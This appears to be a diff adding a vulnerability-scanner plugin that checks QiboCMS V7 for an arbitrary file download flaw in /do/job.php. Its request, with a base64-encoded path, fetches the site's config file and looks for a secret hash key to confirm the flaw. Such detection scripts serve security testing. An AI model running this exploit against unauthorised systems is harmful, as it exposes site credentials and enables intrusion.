@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
+#define bug = "webdb\['mymd5'\]
+#define info = /do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8 存在QiboCMS V7 /do/job.php 任意文件下载漏洞
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
